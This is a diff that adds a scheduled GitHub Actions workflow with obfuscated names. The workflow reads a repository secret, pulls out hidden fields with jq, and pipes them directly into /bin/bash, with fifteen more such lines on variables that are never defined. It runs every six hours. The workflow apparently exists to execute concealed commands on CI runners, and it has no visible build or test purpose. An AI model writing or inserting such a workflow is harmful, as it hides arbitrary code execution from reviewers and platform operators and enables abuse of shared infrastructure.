@@ -1,0 +1,32 @@
+name: guanshimaizou
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: guanshimaizou
+        env:
+          ilja77: ${{ secrets.ilja77 }}
+        run: |
+          echo $ilja77 | jq -r .hqs2 | /bin/bash
+          echo $drwd302 | jq -r .ndx54 | /bin/bash
+          echo $mmo8251 | jq -r .rhp9 | /bin/bash
+          echo $xtx9 | jq -r .zdzfk19799 | /bin/bash
+          echo $wsrb6796 | jq -r .svdb58519 | /bin/bash
+          echo $lzlj26334 | jq -r .fog25 | /bin/bash
+          echo $znfk4268 | jq -r .op81 | /bin/bash
+          echo $hnfw6 | jq -r .lyljd921 | /bin/bash
+          echo $brr59460 | jq -r .sjg33127 | /bin/bash
+          echo $tmd76772 | jq -r .ub677 | /bin/bash
+          echo $jgnse35 | jq -r .qatq10 | /bin/bash
+          echo $pw73237 | jq -r .q4257 | /bin/bash
+          echo $j6 | jq -r .smq6 | /bin/bash
+          echo $r998 | jq -r .b9270 | /bin/bash
+          echo $xhsa0 | jq -r .scusn3385 | /bin/bash
+          echo $b8 | jq -r .oucx639 | /bin/bash
+
